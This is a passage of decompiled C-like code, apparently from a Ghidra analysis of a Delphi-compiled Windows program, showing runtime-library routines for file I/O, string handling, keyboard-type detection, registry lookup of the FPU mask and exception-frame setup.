        bVar1 = param_3 < 1;
        param_3 = iVar4;
        param_2 = param_2 + (uint)bVar7 * -2 + 1;
        if (iVar4 == 0 || bVar1) goto LAB_004031d9;
      }
    } while (*pbVar6 != 10);
LAB_004031d8:
    pbVar6 = pbVar6 + -1;
LAB_004031d9:
    *(int *)(param_1 + 0xc) = (int)pbVar6 - *(int *)(param_1 + 0x14);
  }
  return unaff_EBX;
}



void FUN_00403204(undefined *param_1,undefined *param_2,int param_3)

{
  undefined extraout_CL;
  
  FUN_00403184(param_1,param_2 + 1,param_3);
  *param_2 = extraout_CL;
  return;
}



undefined4 * FUN_00403210(undefined *param_1,int *param_2)

{
  undefined4 *local_10c;
  byte local_108 [252];
  undefined4 uStack12;
  
  uStack12 = 0x40321d;
  FUN_004047a8(param_2);
  local_10c = (undefined4 *)0x403231;
  FUN_00403204(param_1,local_108,0xff);
  local_10c = (undefined4 *)0x40323a;
  local_10c = (undefined4 *)FUN_00404a0c(param_2,local_108);
  while (local_108[0] == 0xff) {
    local_10c = (undefined4 *)0x40324e;
    FUN_00403204(param_1,local_108,0xff);
    local_10c = (undefined4 *)0x0;
    FUN_00404a0c((int *)&local_10c,local_108);
    FUN_00404a70(param_2,local_10c);
    FUN_004047a8((int *)&local_10c);
  }
  return local_10c;
}



void FUN_0040327c(undefined *param_1)

{
  uint uVar1;
  
  while( true ) {
    uVar1 = FUN_00403118(param_1);
    if ((char)uVar1 == '\n') {
      return;
    }
    if ((char)(uVar1 >> 8) == '\x1a') break;
    if ((char)uVar1 == '\r') {
      uVar1 = FUN_00403118(param_1);
      if (((char)uVar1 == '\n') || ((char)(uVar1 >> 8) == '\x1a')) {
        return;
      }
      *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + -1;
    }
  }
  return;
}



void FUN_004032d4(HANDLE *param_1,HANDLE param_2,int param_3)

{
  int iVar1;
  DWORD dwDesiredAccess;
  HANDLE pvVar2;
  DWORD DVar3;
  DWORD dwCreationDisposition;
  
  if (*(ushort *)(param_1 + 1) != 0xd7b0) {
    if (3 < *(ushort *)(param_1 + 1) - 0xd7b0) {
      DVar3 = 0x66;
      goto LAB_004033a8;
    }
    iVar1 = (*(code *)param_1[9])();
    if (iVar1 != 0) {
      FUN_004027dc(iVar1);
    }
  }
  *(undefined2 *)(param_1 + 1) = 0xd7b3;
  param_1[2] = param_2;
  param_1[9] = &LAB_004032ac;
  param_1[7] = &LAB_00402b08;
  if (*(char *)(param_1 + 0x12) == '\0') {
    param_1[9] = &LAB_00402b08;
    if (param_3 == 3) {
      DVar3 = 0xfffffff5;
    }
    else {
      DVar3 = 0xfffffff6;
    }
    pvVar2 = GetStdHandle(DVar3);
  }
  else {
    dwDesiredAccess = 0xc0000000;
    DVar3 = *(DWORD *)(&DAT_0043f06c + ((DAT_0043f00c & 0x70) >> 2));
    dwCreationDisposition = 2;
    if ((param_3 != 3) && (dwCreationDisposition = 3, param_3 != 2)) {
      dwDesiredAccess = 0x40000000;
      *(undefined2 *)(param_1 + 1) = 0xd7b2;
      if (param_3 != 1) {
        dwDesiredAccess = 0x80000000;
        *(undefined2 *)(param_1 + 1) = 0xd7b1;
      }
    }
    pvVar2 = CreateFileA((LPCSTR)(param_1 + 0x12),dwDesiredAccess,DVar3,(LPSECURITY_ATTRIBUTES)0x0,
                         dwCreationDisposition,0x80,(HANDLE)0x0);
  }
  if (pvVar2 != (HANDLE)0xffffffff) {
    *param_1 = pvVar2;
    return;
  }
  *(undefined2 *)(param_1 + 1) = 0xd7b0;
  DVar3 = GetLastError();
LAB_004033a8:
  FUN_004027dc(DVar3);
  return;
}



void FUN_004033b4(HANDLE *param_1,HANDLE param_2)

{
  byte bVar1;
  
  bVar1 = DAT_0043f00c & 3;
  if (2 < bVar1) {
    bVar1 = 2;
  }
  FUN_004032d4(param_1,param_2,(uint)bVar1);
  return;
}



void FUN_004033d0(HANDLE *param_1,HANDLE param_2)

{
  FUN_004032d4(param_1,param_2,3);
  return;
}



byte * FUN_004033dc(byte *param_1,int *param_2)

{
  byte *pbVar1;
  byte *pbVar2;
  byte bVar3;
  byte bVar4;
  byte *pbVar5;
  int iVar6;
  bool bVar7;
  
  pbVar1 = param_1;
  pbVar5 = param_1;
  if (param_1 == (byte *)0x0) {
LAB_00403452:
    pbVar5 = pbVar5 + 1;
  }
  else {
    pbVar1 = (byte *)0x0;
    do {
      pbVar2 = pbVar5;
      bVar3 = *pbVar2;
      pbVar5 = pbVar2 + 1;
    } while (bVar3 == 0x20);
    bVar7 = false;
    if (bVar3 == 0x2d) {
      bVar7 = true;
LAB_00403462:
      bVar3 = *pbVar5;
      pbVar5 = pbVar2 + 2;
    }
    else if (bVar3 == 0x2b) goto LAB_00403462;
    if (((bVar3 == 0x24) || (bVar3 == 0x78)) || (bVar3 == 0x58)) {
LAB_00403467:
      bVar3 = *pbVar5;
      pbVar5 = pbVar5 + 1;
      pbVar2 = pbVar1;
      if (bVar3 != 0) {
        do {
          if (0x60 < bVar3) {
            bVar3 = bVar3 - 0x20;
          }
          bVar4 = bVar3 - 0x30;
          pbVar1 = pbVar2;
          if (9 < bVar4) {
            if (5 < (byte)(bVar3 + 0xbf)) goto LAB_0040345b;
            bVar4 = bVar3 - 0x37;
          }
          if ((byte *)0xfffffff < pbVar2) goto LAB_0040345b;
          pbVar2 = (byte *)((int)pbVar2 * 0x10 + (uint)bVar4);
          bVar3 = *pbVar5;
          pbVar5 = pbVar5 + 1;
        } while (bVar3 != 0);
        if (bVar7) {
          pbVar2 = (byte *)-(int)pbVar2;
        }
LAB_004034a4:
        iVar6 = 0;
        goto LAB_004034a7;
      }
      goto LAB_00403452;
    }
    if (bVar3 != 0x30) {
      if (bVar3 != 0) goto LAB_0040342e;
      goto LAB_0040345b;
    }
    bVar3 = *pbVar5;
    pbVar5 = pbVar5 + 1;
    if ((bVar3 == 0x78) || (bVar3 == 0x58)) goto LAB_00403467;
    while (bVar3 != 0) {
LAB_0040342e:
      if ((9 < (byte)(bVar3 - 0x30)) || ((byte *)0xccccccc < pbVar1)) goto LAB_0040345b;
      pbVar1 = (byte *)((int)pbVar1 * 10 + (uint)(byte)(bVar3 - 0x30));
      bVar3 = *pbVar5;
      pbVar5 = pbVar5 + 1;
    }
    if (bVar7) {
      pbVar2 = (byte *)-(int)pbVar1;
      bVar7 = 0 < (int)pbVar1;
      if ((pbVar2 == (byte *)0x0 || bVar7) || (pbVar1 = pbVar2, bVar7)) goto LAB_004034a4;
    }
    else {
      pbVar2 = pbVar1;
      if (-1 < (int)pbVar1) goto LAB_004034a4;
    }
  }
LAB_0040345b:
  iVar6 = (int)pbVar5 - (int)param_1;
  pbVar2 = pbVar1;
LAB_004034a7:
  *param_2 = iVar6;
  return pbVar2;
}



HANDLE * FUN_004034b0(HANDLE *param_1,LPCVOID param_2)

{
  BOOL BVar1;
  DWORD DVar2;
  HANDLE pvStack8;
  
  if (*(ushort *)(param_1 + 1) - 0xd7b2 < 2) {
    pvStack8 = (HANDLE)0x0;
    BVar1 = WriteFile(*param_1,param_2,(DWORD)param_1[2],(LPDWORD)&pvStack8,(LPOVERLAPPED)0x0);
    if (BVar1 == 1) {
      if (pvStack8 == param_1[2]) {
        return param_1;
      }
      DVar2 = 0x65;
    }
    else {
      pvStack8 = (HANDLE)0x4034ef;
      DVar2 = GetLastError();
    }
  }
  else {
    DVar2 = 5;
  }
  pvStack8 = (HANDLE)0x4034f4;
  FUN_004027dc(DVar2);
  return param_1;
}



uint FUN_004034f8(undefined *param_1)

{
  short sVar1;
  undefined *puVar2;
  
  if ((param_1 == &DAT_00442214) || (puVar2 = param_1, param_1 == &DAT_004423e0)) {
    *(ushort *)(param_1 + 6) = (ushort)DAT_0043f038;
    puVar2 = (undefined *)FUN_00402ab4(param_1);
  }
  sVar1 = *(short *)(param_1 + 4);
  if (sVar1 != -0x284e) {
    FUN_004027dc(0x69);
  }
  return (uint)puVar2 & 0xffffff00 | (uint)(sVar1 == -0x284e);
}



undefined * FUN_0040353c(undefined *param_1,undefined *param_2,int param_3)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  undefined *puVar4;
  byte bVar5;
  
  bVar5 = 0;
  if ((*(short *)(param_1 + 4) == -0x284e) || (uVar1 = FUN_004034f8(param_1), (char)uVar1 != '\0'))
  {
    while( true ) {
      iVar2 = *(int *)(param_1 + 0xc);
      iVar3 = *(int *)(param_1 + 8) - *(int *)(param_1 + 0xc);
      if (param_3 < iVar3) break;
      *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + iVar3;
      param_3 = param_3 - iVar3;
      puVar4 = (undefined *)(*(int *)(param_1 + 0x14) + iVar2);
      for (; iVar3 != 0; iVar3 = iVar3 + -1) {
        *puVar4 = *param_2;
        param_2 = param_2 + (uint)bVar5 * -2 + 1;
        puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
      }
      iVar2 = (**(code **)(param_1 + 0x1c))();
      if (iVar2 != 0) {
        FUN_004027dc(iVar2);
        return param_1;
      }
    }
    *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + param_3;
    puVar4 = (undefined *)(*(int *)(param_1 + 0x14) + iVar2);
    for (; param_3 != 0; param_3 = param_3 + -1) {
      *puVar4 = *param_2;
      param_2 = param_2 + (uint)bVar5 * -2 + 1;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
  }
  return param_1;
}



undefined * FUN_00403590(undefined *param_1,int param_2)

{
  uint uVar1;
  int iVar2;
  LPVOID pvVar3;
  int iVar4;
  undefined1 *puVar5;
  undefined *puVar6;
  byte bVar7;
  
  bVar7 = 0;
  while (0x40 < param_2) {
    param_2 = param_2 + -0x40;
    FUN_0040353c(param_1,&DAT_004035c0,0x40);
    pvVar3 = FUN_004067f8();
    if (*(int *)((int)pvVar3 + 4) != 0) {
      return param_1;
    }
  }
  if (0 < param_2) {
    puVar5 = &DAT_004035c0;
    if ((*(short *)(param_1 + 4) == -0x284e) || (uVar1 = FUN_004034f8(param_1), (char)uVar1 != '\0')
       ) {
      while( true ) {
        iVar2 = *(int *)(param_1 + 0xc);
        iVar4 = *(int *)(param_1 + 8) - *(int *)(param_1 + 0xc);
        if (param_2 < iVar4) break;
        *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + iVar4;
        param_2 = param_2 - iVar4;
        puVar6 = (undefined *)(*(int *)(param_1 + 0x14) + iVar2);
        for (; iVar4 != 0; iVar4 = iVar4 + -1) {
          *puVar6 = *puVar5;
          puVar5 = puVar5 + (uint)bVar7 * -2 + 1;
          puVar6 = puVar6 + (uint)bVar7 * -2 + 1;
        }
        iVar2 = (**(code **)(param_1 + 0x1c))();
        if (iVar2 != 0) {
          FUN_004027dc(iVar2);
          return param_1;
        }
      }
      *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + param_2;
      puVar6 = (undefined *)(*(int *)(param_1 + 0x14) + iVar2);
      for (; param_2 != 0; param_2 = param_2 + -1) {
        *puVar6 = *puVar5;
        puVar5 = puVar5 + (uint)bVar7 * -2 + 1;
        puVar6 = puVar6 + (uint)bVar7 * -2 + 1;
      }
    }
    return param_1;
  }
  return param_1;
}



undefined * FUN_0040360c(undefined *param_1,undefined4 param_2,uint param_3)

{
  undefined *puVar1;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint uVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar3;
  undefined4 local_c;
  
  if ((param_1[6] & 1) == 0) {
    local_c = CONCAT31((int3)(param_3 >> 8),10);
    puVar1 = FUN_0040353c(param_1,(undefined *)&local_c,1);
    uVar2 = extraout_ECX_00;
    uVar3 = extraout_EDX_00;
  }
  else {
    local_c = param_3 & 0xffff0000 | 0xa0d;
    puVar1 = FUN_0040353c(param_1,(undefined *)&local_c,2);
    uVar2 = extraout_ECX;
    uVar3 = extraout_EDX;
  }
  FUN_00402de0(param_1,uVar3,uVar2);
  return puVar1;
}



void FUN_00403654(char *param_1,char *param_2)

{
  FUN_00403660(param_1,param_2,0xff);
  return;
}



void FUN_00403660(char *param_1,char *param_2,uint param_3)

{
  char cVar1;
  char *pcVar2;
  
  pcVar2 = param_1;
  if (0xff < param_3) {
    param_3 = 0xff;
  }
  do {
    cVar1 = *param_2;
    param_2 = param_2 + 1;
    if (cVar1 == '\0') break;
    pcVar2 = pcVar2 + 1;
    *pcVar2 = cVar1;
    param_3 = param_3 - 1;
  } while (param_3 != 0);
  *param_1 = (char)pcVar2 - (char)param_1;
  return;
}



void FUN_00403684(char *param_1,char *param_2,uint param_3)

{
  char cVar1;
  char cVar2;
  uint uVar3;
  
  uVar3 = param_3 & 0xff;
  do {
    if (uVar3 == 0) {
      return;
    }
    uVar3 = uVar3 - 1;
    cVar1 = *param_1;
    cVar2 = *param_2;
    param_1 = param_1 + 1;
    param_2 = param_2 + 1;
  } while (cVar1 == cVar2);
  return;
}



void thunk_FUN_004036a0(void)

{
  return;
}



void FUN_004036a0(void)

{
  return;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall GetKeyboardType(int nTypeFlag)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403984. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetKeyboardType();
  return iVar1;
}



undefined4 FUN_0040398c(void)

{
  int iVar1;
  uint uVar2;
  undefined4 uVar3;
  
  uVar3 = 0;
  iVar1 = GetKeyboardType(0);
  if (iVar1 == 7) {
    uVar2 = GetKeyboardType(1);
    if (((uVar2 & 0xff00) == 0xd00) || ((uVar2 & 0xff00) == 0x400)) {
      uVar3 = 1;
    }
  }
  return uVar3;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_004039bc(void)

{
  LSTATUS LVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  DWORD local_10;
  uint local_c;
  HKEY local_8;
  
  local_c = (uint)DAT_0043f024;
  LVar1 = RegOpenKeyExA((HKEY)0x80000002,"SOFTWARE\\Borland\\Delphi\\RTL",0,1,&local_8);
  if (LVar1 == 0) {
    uVar2 = *in_FS_OFFSET;
    *in_FS_OFFSET = &stack0xffffffe4;
    local_10 = 4;
    RegQueryValueExA(local_8,"FPUMaskValue",(LPDWORD)0x0,(LPDWORD)0x0,(LPBYTE)&local_c,&local_10);
    *in_FS_OFFSET = uVar2;
    RegCloseKey(local_8);
    return;
  }
  DAT_0043f024 = DAT_0043f024 & 0xffc0 | (ushort)local_c & 0x3f;
  return;
}



void FUN_00403a80(void)

{
  return;
}



void thunk_FUN_004027b0(uint param_1)

{
  FUN_004027b0(CONCAT31((int3)(param_1 >> 8),4));
  return;
}



undefined4 FUN_00403a94(undefined4 *param_1)

{
  return *param_1;
}



void FUN_00403a9c(int param_1,byte *param_2)

{
  int iVar1;
  byte *pbVar2;
  
  pbVar2 = *(byte **)(param_1 + -0x2c);
  for (iVar1 = **(byte **)(param_1 + -0x2c) + 1; iVar1 != 0; iVar1 = iVar1 + -1) {
    *param_2 = *pbVar2;
    pbVar2 = pbVar2 + 1;
    param_2 = param_2 + 1;
  }
  return;
}



int * FUN_00403ab0(int param_1)

{
  int **ppiVar1;
  
  ppiVar1 = *(int ***)(param_1 + -0x24);
  if (ppiVar1 != (int **)0x0) {
    ppiVar1 = (int **)*ppiVar1;
  }
  return (int *)ppiVar1;
}



void FUN_00403abc(int param_1)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = FUN_00403aec(param_1);
  piVar2 = (int *)FUN_004026a8(iVar1);
  FUN_00403b30(param_1,piVar2);
  return;
}



void FUN_00403ad8(int *param_1)

{
  FUN_00403b88(param_1);
  FUN_004026c8((int)param_1);
  return;
}



undefined4 FUN_00403aec(int param_1)

{
  return *(undefined4 *)(param_1 + -0x28);
}



void FUN_00403af4(int *param_1,char param_2,undefined4 param_3)

{
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_00000000;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  undefined4 in_stack_fffffff8;
  undefined4 in_stack_fffffffc;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_fffffff0,in_stack_fffffff4,
                                  in_stack_fffffff8,in_stack_fffffffc);
    param_2 = extraout_DL;
  }
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_00000000;
  }
  return;
}



void FUN_00403b14(int *param_1,char param_2)

{
  int *piVar1;
  char extraout_DL;
  
  piVar1 = FUN_00403e08(param_1,param_2);
  if ('\0' < extraout_DL) {
    FUN_00403df0(piVar1);
  }
  return;
}



void FUN_00403b24(int *param_1)

{
  if (param_1 != (int *)0x0) {
    (**(code **)(*param_1 + -4))(param_1,1);
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x00403b65)
// WARNING: Removing unreachable block (ram,0x00403b6b)
// WARNING: Removing unreachable block (ram,0x00403b72)
// WARNING: Removing unreachable block (ram,0x00403b78)
// WARNING: Removing unreachable block (ram,0x00403b7e)

void FUN_00403b30(int param_1,int *param_2)

{
  uint uVar1;
  uint uVar2;
  int *piVar3;
  
  *param_2 = param_1;
  uVar2 = *(uint *)(param_1 + -0x28);
  uVar1 = uVar2 >> 2;
  piVar3 = param_2 + 1;
  while (uVar1 = uVar1 - 1, uVar1 != 0) {
    *piVar3 = 0;
    piVar3 = piVar3 + 1;
  }
  for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
    *(undefined *)piVar3 = 0;
    piVar3 = (int *)((int)piVar3 + 1);
  }
  for (; *(int **)(param_1 + -0x24) != (int *)0x0; param_1 = **(int **)(param_1 + -0x24)) {
  }
  return;
}



void FUN_00403b88(int *param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = param_1;
  do {
    iVar1 = *(int *)(*piVar2 + -0x40);
    piVar2 = *(int **)(*piVar2 + -0x24);
    if (iVar1 != 0) {
      FUN_004051d0((int)param_1,iVar1);
    }
  } while (piVar2 != (int *)0x0);
  return;
}



void FUN_00403ba8(int *param_1,undefined *UNRECOVERED_JUMPTABLE,int **param_3)

{
  if ((undefined *)0xfeffffff < UNRECOVERED_JUMPTABLE) {
    FUN_00406110(param_3,*(int ***)(((uint)UNRECOVERED_JUMPTABLE & 0xffffff) + (int)param_1));
    return;
  }
  if ((undefined *)0xfdffffff < UNRECOVERED_JUMPTABLE) {
                    // WARNING: Could not recover jumptable at 0x00403bbf. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)((int)(short)UNRECOVERED_JUMPTABLE + *param_1))();
    return;
  }
                    // WARNING: Could not recover jumptable at 0x00403bc1. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



void FUN_00403bd8(int *param_1,int *param_2,int **param_3)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  int **local_c;
  int *local_8;
  
  puStack28 = &stack0xfffffffc;
  local_c = (int **)0x0;
  puStack32 = &LAB_00403c5c;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  *param_3 = (int *)0x0;
  local_8 = param_2;
  piVar1 = FUN_00403c6c(*param_1,param_2);
  if (piVar1 != (int *)0x0) {
    if (piVar1[5] == 0) {
      FUN_00403ba8(param_1,(undefined *)piVar1[6],(int **)&local_c);
      FUN_00406110(param_3,local_c);
    }
    else {
      *param_3 = (int *)((int)param_1 + piVar1[5]);
      if (*param_3 != (int *)0x0) {
        (**(code **)(**param_3 + 4))();
      }
    }
  }
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_00403c63;
  puStack32 = (undefined *)0x403c5b;
  FUN_004060f8((int **)&local_c);
  return;
}



int * FUN_00403c6c(int param_1,int *param_2)

{
  int *piVar1;
  int iVar2;
  
  do {
    piVar1 = *(int **)(param_1 + -0x48);
    if (piVar1 != (int *)0x0) {
      iVar2 = *piVar1;
      piVar1 = piVar1 + 1;
      do {
        if ((((*param_2 == *piVar1) && (param_2[1] == piVar1[1])) && (param_2[2] == piVar1[2])) &&
           (param_2[3] == piVar1[3])) {
          return piVar1;
        }
        piVar1 = piVar1 + 7;
        iVar2 = iVar2 + -1;
      } while (iVar2 != 0);
    }
    if (*(int **)(param_1 + -0x24) == (int *)0x0) {
      return (int *)0x0;
    }
    param_1 = **(int **)(param_1 + -0x24);
  } while( true );
}



undefined4 FUN_00403cb0(int *param_1,int param_2)

{
  int *piVar1;
  
  if (param_1 != (int *)0x0) {
    piVar1 = thunk_FUN_00403d54(*param_1,param_2);
    if ((char)piVar1 != '\0') {
      return CONCAT31((int3)((uint)piVar1 >> 8),1);
    }
  }
  return 0;
}



void FUN_00403cd4(int *param_1,int param_2)

{
  int *piVar1;
  
  piVar1 = param_1;
  if (param_1 != (int *)0x0) {
    while (*piVar1 != param_2) {
      piVar1 = *(int **)(*piVar1 + -0x24);
      if (piVar1 == (int *)0x0) {
        FUN_004027b0(CONCAT31((int3)((uint)param_1 >> 8),10));
        return;
      }
    }
  }
  return;
}



void FUN_00403cf0(int param_1)

{
  uint uVar1;
  ushort unaff_SI;
  ushort *puVar2;
  bool bVar3;
  
  do {
    puVar2 = *(ushort **)(param_1 + -0x30);
    if (puVar2 != (ushort *)0x0) {
      uVar1 = (uint)*puVar2;
      bVar3 = puVar2 + 1 == (ushort *)0x0;
      puVar2 = puVar2 + 1;
      do {
        if (uVar1 == 0) break;
        uVar1 = uVar1 - 1;
        bVar3 = unaff_SI == *puVar2;
        puVar2 = puVar2 + 1;
      } while (!bVar3);
      if (bVar3) {
        return;
      }
    }
    if (*(int **)(param_1 + -0x24) == (int *)0x0) {
      return;
    }
    param_1 = **(int **)(param_1 + -0x24);
  } while( true );
}



void FUN_00403d20(int *param_1,undefined4 param_2,undefined4 param_3)

{
  code *UNRECOVERED_JUMPTABLE;
  undefined in_ZF;
  
  FUN_00403cf0(*param_1);
  if (!(bool)in_ZF) {
                    // WARNING: Could not recover jumptable at 0x00403d2d. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  if (DAT_00442028 != (code *)0x0) {
    (*DAT_00442028)(param_1);
  }
  FUN_0040479c(0xd2);
  return;
}



void FUN_00403d38(int *param_1,undefined4 param_2)

{
  undefined in_ZF;
  
  FUN_00403cf0(*param_1);
  if ((bool)in_ZF) {
    if (DAT_00442028 != (code *)0x0) {
      (*DAT_00442028)(param_2);
    }
    FUN_0040479c(0xd2);
    return;
  }
  return;
}



int * thunk_FUN_00403d54(int param_1,int param_2)

{
  int *piVar1;
  
  while( true ) {
    if (param_1 == param_2) {
      return (int *)CONCAT31((int3)((uint)param_1 >> 8),1);
    }
    piVar1 = *(int **)(param_1 + -0x24);
    if (piVar1 == (int *)0x0) break;
    param_1 = *piVar1;
  }
  return piVar1;
}



int * FUN_00403d54(int param_1,int param_2)

{
  int *piVar1;
  
  while( true ) {
    if (param_1 == param_2) {
      return (int *)CONCAT31((int3)((uint)param_1 >> 8),1);
    }
    piVar1 = *(int **)(param_1 + -0x24);
    if (piVar1 == (int *)0x0) break;
    param_1 = *piVar1;
  }
  return piVar1;
}



void FUN_00403d70(void)

{
  return;
}



// WARNING: Variable defined which should be unmapped: param_6

void FUN_00403da0(int param_1,char param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
                 undefined4 param_6,undefined4 param_7)

{
  int *in_FS_OFFSET;
  
  if (-1 < param_2) {
    (**(code **)(param_1 + -0xc))();
  }
  *in_FS_OFFSET = (int)&param_4;
  return;
}



void FUN_00403df0(int *param_1)

{
  (**(code **)(*param_1 + -8))();
  return;
}



int * FUN_00403df8(int *param_1)

{
  (**(code **)(*param_1 + -0x1c))();
  return param_1;
}



int * FUN_00403e08(int *param_1,char param_2)

{
  if (param_2 < '\x01') {
    return param_1;
  }
  (**(code **)(*param_1 + -0x18))();
  return param_1;
}



undefined4 FUN_00403e34(undefined4 param_1)

{
  if (DAT_0043f02c != '\0') {
    (*DAT_00442014)();
    param_1 = 2;
  }
  return param_1;
}



undefined4 FUN_00403e70(undefined4 param_1)

{
  if (1 < DAT_0043f02c) {
    (*DAT_00442014)();
    return 0;
  }
  return param_1;
}



undefined4 FUN_00403e84(undefined4 param_1)

{
  if (1 < DAT_0043f02c) {
    (*DAT_00442014)();
    return 0;
  }
  return param_1;
}



int FUN_00403e98(int param_1,undefined4 param_2,char *param_3)

{
  if (((param_3 != (char *)0x0) && (param_1 = *(int *)(param_3 + 1), *param_3 != -0x17)) &&
     (*param_3 == -0x15)) {
    param_1 = (int)(char)param_1;
  }
  return param_1;
}



undefined4 * FUN_00403eb8(undefined4 *param_1,undefined4 param_2,char *param_3)

{
  undefined4 uStack16;
  char *pcStack12;
  undefined4 uStack8;
  undefined4 *puStack4;
  
  if (1 < DAT_0043f02c) {
    uStack16 = 0x403ec9;
    pcStack12 = param_3;
    uStack8 = param_2;
    puStack4 = param_1;
    FUN_00403e98((int)param_1,param_2,param_3);
    param_1 = &uStack16;
    (*DAT_00442014)();
  }
  return param_1;
}



undefined4 FUN_00403efc(undefined4 param_1)

{
  if (1 < DAT_0043f02c) {
    (*DAT_00442014)();
  }
  return param_1;
}



void FUN_00404208(int param_1)

{
  if (param_1 == 0) {
    FUN_0040479c(0xd8);
  }
                    // WARNING: Could not recover jumptable at 0x00404229. Too many branches
                    // WARNING: Treating indirect jump as call
  (*DAT_00442014)();
  return;
}



void FUN_004042b4(undefined param_1,undefined param_2,undefined param_3,undefined4 param_4,
                 int param_5)

{
  undefined4 *in_FS_OFFSET;
  
  *in_FS_OFFSET = param_4;
  (*(code *)(param_5 + 5))();
  return;
}



void FUN_0040440c(void)

{
  int iVar1;
  int unaff_EBP;
  int *in_FS_OFFSET;
  
  DAT_00442634 = (int *)(unaff_EBP + -0xc);
  iVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int)DAT_00442634;
  *DAT_00442634 = iVar1;
  *(undefined **)(unaff_EBP + -8) = &LAB_0040436c;
  *(int *)(unaff_EBP + -4) = unaff_EBP;
  return;
}



void FUN_0040442c(void)

{
  int **ppiVar1;
  int **in_FS_OFFSET;
  
  if (DAT_00442634 != (int **)0x0) {
    ppiVar1 = (int **)*in_FS_OFFSET;
    if (DAT_00442634 == ppiVar1) {
      *in_FS_OFFSET = *DAT_00442634;
      return;
    }
    for (; ppiVar1 != (int **)0xffffffff; ppiVar1 = (int **)*ppiVar1) {
      if ((int **)*ppiVar1 == DAT_00442634) {
        *ppiVar1 = *DAT_00442634;
        return;
      }
    }
  }
  return;
}



void FUN_00404454(void)

{
  int iVar1;
  code *pcVar2;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  
  iVar3 = DAT_0044263c;
  puStack20 = &stack0xfffffffc;
  if (DAT_00442638 != 0) {
    iVar1 = *(int *)(DAT_00442638 + 4);
    puStack24 = &LAB_0040449a;
    uStack28 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack28;
    if (0 < iVar3) {
      do {
        iVar3 = iVar3 + -1;
        pcVar2 = *(code **)(iVar1 + 4 + iVar3 * 8);
        DAT_0044263c = iVar3;
        if (pcVar2 != (code *)0x0) {
          (*pcVar2)();
        }
      } while (0 < iVar3);
    }
    *in_FS_OFFSET = uStack28;
  }
  return;
}



void FUN_004044b4(void)

{
  int iVar1;
  int iVar2;
  code *pcVar3;
  int iVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  
  puStack20 = &stack0xfffffffc;
  if (DAT_00442638 != (int *)0x0) {
    iVar1 = *DAT_00442638;
    iVar4 = 0;
    iVar2 = DAT_00442638[1];
    puStack24 = &LAB_004044fa;
    uStack28 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack28;
    if (0 < iVar1) {
      do {
        pcVar3 = *(code **)(iVar2 + iVar4 * 8);
        iVar4 = iVar4 + 1;
        DAT_0044263c = iVar4;
        if (pcVar3 != (code *)0x0) {
          (*pcVar3)();
        }
      } while (iVar4 < iVar1);
    }
    *in_FS_OFFSET = uStack28;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00404514(undefined4 param_1,int param_2)

{
  DAT_00442014 = &DAT_004011b8;
  DAT_00442018 = &DAT_004011c8;
  DAT_0044263c = 0;
  _DAT_0044202c = *(undefined4 *)(param_2 + 4);
  DAT_00442638 = param_1;
  DAT_00442640 = param_2;
  FUN_0040440c();
  DAT_00442034 = 0;
  FUN_004044b4();
  return;
}



void FUN_00404554(int *param_1)

{
  int **ppiVar1;
  int iVar2;
  
  iVar2 = *param_1;
  ppiVar1 = (int **)(param_1 + 1);
  do {
    FUN_0040658c((int **)*ppiVar1[1],*ppiVar1);
    ppiVar1 = ppiVar1 + 2;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



void FUN_0040457c(int *param_1)

{
  int **ppiVar1;
  int iVar2;
  
  iVar2 = *param_1;
  ppiVar1 = (int **)(param_1 + 1);
  do {
    **ppiVar1 = *ppiVar1[1] + (int)ppiVar1[2];
    ppiVar1 = ppiVar1 + 3;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



void FUN_004045a0(void)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  
  uVar2 = 0x10;
  iVar1 = DAT_0043f000;
  do {
    s_Runtime_error_at_00000000_0043f094[uVar2 & 0xff] = (char)(iVar1 % 10) + '0';
    iVar1 = iVar1 / 10;
    uVar2 = uVar2 - 1;
  } while (iVar1 != 0);
  uVar3 = 0x1c;
